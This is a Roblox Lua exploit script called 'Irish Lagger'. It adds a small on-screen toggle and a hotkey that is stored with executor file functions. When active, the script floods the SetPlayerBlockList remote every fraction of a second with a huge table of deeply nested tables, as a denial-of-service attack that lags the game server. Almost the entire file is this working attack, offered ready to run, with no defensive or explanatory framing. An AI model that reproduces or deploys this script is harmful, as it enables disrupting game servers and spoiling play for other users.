local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local cfg = {
    x = 9,
    y = 1,
    z = 0.19
}

local remoteStuff = "RobloxReplicatedStorage.SetPlayerBlockList"

local textThing, frameThing, btnThing, statusThing
local active = false
local hotkey = nil

local screenThing = Instance.new("ScreenGui")
screenThing.Name = "IrishLaggerGui"
screenThing.ResetOnSpawn = false
screenThing.Parent = plrGui

for _,kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "IrishLaggerGui" and kid ~= screenThing then
        kid:Destroy()
    end
end

frameThing = Instance.new("Frame")
frameThing.Name = "MainFrame"
frameThing.Size = UDim2.new(0, 220, 0, 70)
frameThing.Position = UDim2.new(0.5, -110, 0.5, -35)
frameThing.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
frameThing.BackgroundTransparency = 0.1
frameThing.BorderSizePixel = 0
frameThing.Active = true
frameThing.Draggable = true
frameThing.ClipsDescendants = true
frameThing.Parent = screenThing

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frameThing

local borderThing = Instance.new("UIStroke")
borderThing.Color = Color3.fromRGB(0, 0, 0)
borderThing.Thickness = 2
borderThing.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
borderThing.Parent = frameThing

local topBar = Instance.new("Frame")
topBar.Name = "TitleBar"
topBar.Size = UDim2.new(1, 0, 0, 28)
topBar.BackgroundTransparency = 1
topBar.Parent = frameThing

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0.6, 0, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "Irish Lagger"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 11
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = topBar

statusThing = Instance.new("TextLabel")
statusThing.Size = UDim2.new(0.4, 0, 1, 0)
statusThing.Position = UDim2.new(0.6, 0, 0, 0)
statusThing.BackgroundTransparency = 1
statusThing.Text = "OFF"
statusThing.TextColor3 = Color3.fromRGB(255, 100, 100)
statusThing.TextSize = 9
statusThing.Font = Enum.Font.GothamBold
statusThing.TextXAlignment = Enum.TextXAlignment.Right
statusThing.Parent = topBar

local line = Instance.new("Frame")
line.Size = UDim2.new(1, -16, 0, 1)
line.Position = UDim2.new(0, 8, 0, 28)
line.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
line.BackgroundTransparency = 0.3
line.BorderSizePixel = 0
line.Parent = frameThing

btnThing = Instance.new("TextButton")
btnThing.Size = UDim2.new(1, -16, 0, 30)
btnThing.Position = UDim2.new(0, 8, 0, 34)
btnThing.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
btnThing.BorderSizePixel = 0
btnThing.AutoButtonColor = false
btnThing.Text = ""
btnThing.Parent = frameThing

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = btnThing

local btnBorder = Instance.new("UIStroke")
btnBorder.Color = Color3.fromRGB(0, 0, 0)
btnBorder.Thickness = 1
btnBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
btnBorder.Parent = btnThing

local keyBtn = Instance.new("TextButton")
keyBtn.Size = UDim2.new(0, 22, 0, 22)
keyBtn.Position = UDim2.new(0, 6, 0.5, -11)
keyBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
keyBtn.BackgroundTransparency = 1
keyBtn.Text = "?"
keyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
keyBtn.Font = Enum.Font.GothamBold
keyBtn.TextSize = 8
keyBtn.BorderSizePixel = 0
keyBtn.ZIndex = 3
keyBtn.Parent = btnThing

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(1, 0)
keyCorner.Parent = keyBtn

local keyBorder = Instance.new("UIStroke")
keyBorder.Color = Color3.fromRGB(255, 255, 255)
keyBorder.Thickness = 1
keyBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
keyBorder.Parent = keyBtn

textThing = Instance.new("TextLabel")
textThing.Size = UDim2.new(0.55, 0, 1, 0)
textThing.Position = UDim2.new(0, 34, 0, 0)
textThing.BackgroundTransparency = 1
textThing.Text = "Lagger"
textThing.TextColor3 = Color3.fromRGB(255, 255, 255)
textThing.Font = Enum.Font.GothamBold
textThing.TextSize = 10
textThing.TextXAlignment = Enum.TextXAlignment.Left
textThing.ZIndex = 3
textThing.Parent = btnThing

local saveLoc = "IrishLagger_Keybind.txt"

function grabKey()
    local worked, data = pcall(readfile, saveLoc)
    if worked and data and data ~= "" then
        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
            if code.Name == data then
                hotkey = code
                keyBtn.Text = code.Name:sub(1,1)
                break
            end
        end
    end
    if not hotkey then
        keyBtn.Text = "?"
    end
end

function storeKey(key)
    hotkey = key
    keyBtn.Text = key.Name:sub(1,1)
    pcall(writefile, saveLoc, key.Name)
end

grabKey()

function getRemote(road)
    if not road or road == "" then
        return nil
    end
    local obj = game
    local clean = road:gsub("^game%.", "")
    for piece in clean:gmatch("[^%.]+") do
        if obj then
            obj = obj[piece]
        else
            return nil
        end
    end
    return obj
end

function doSpam(inc, attempts)
    local mainTable = {}
    local spamTable = {}
    table.insert(spamTable, {})
    local ptr = spamTable[1]
    for i = 1, inc do
        local newTable = {}
        table.insert(ptr, newTable)
        ptr = newTable
    end
    for i = 1, 15000 do
        table.insert(mainTable, spamTable)
        if i % 1000 == 0 then
            task.wait()
        end
    end

    local remoteObj = getRemote(remoteStuff)
    if remoteObj then
        for i = 1, attempts do
            pcall(function()
                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
                    remoteObj:FireServer(mainTable)
                elseif remoteObj:IsA("RemoteFunction") then
                    remoteObj:InvokeServer(mainTable)
                end
            end)
        end
    end
end

function runLoop()
    while active do
        task.spawn(function()
            doSpam(cfg.x, cfg.y)
        end)
        task.wait(cfg.z)
    end
end

function flip(state)
    active = state
    if active then
        btnThing.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btnBorder.Color = Color3.fromRGB(0, 0, 0)
        statusThing.Text = "ON"
        statusThing.TextColor3 = Color3.fromRGB(100, 255, 100)
        task.spawn(runLoop)
    else
        btnThing.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
        btnBorder.Color = Color3.fromRGB(0, 0, 0)
        statusThing.Text = "OFF"
        statusThing.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end

btnThing.MouseButton1Click:Connect(function()
    flip(not active)
end)

local waiting = false

keyBtn.MouseButton1Click:Connect(function()
    waiting = true
    keyBtn.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, processedInput)
    if processedInput then
        return
    end

    if input.KeyCode == Enum.KeyCode.LeftControl then
        frameThing.Visible = not frameThing.Visible
        return
    end

    if waiting and input.UserInputType == Enum.UserInputType.Keyboard then
        storeKey(input.KeyCode)
        waiting = false
    elseif hotkey and input.KeyCode == hotkey then
        flip(not active)
    end
end)

local closeBtn = Instance.new("TextButton")
closeBtn.Visible = false
closeBtn.Parent = topBar
closeBtn.MouseButton1Click:Connect(function()
    screenThing:Destroy()
end)

local minimized = false
local miniBtn = Instance.new("TextButton")
miniBtn.Visible = false
miniBtn.Parent = topBar
miniBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    btnThing.Visible = not minimized
    
    if minimized then
        frameThing:TweenSize(UDim2.new(0, 220, 0, 60), "Out", "Quad", 0.2, true)
    else
        frameThing:TweenSize(UDim2.new(0, 220, 0, 70), "Out", "Quad", 0.2, true)
    end
end)
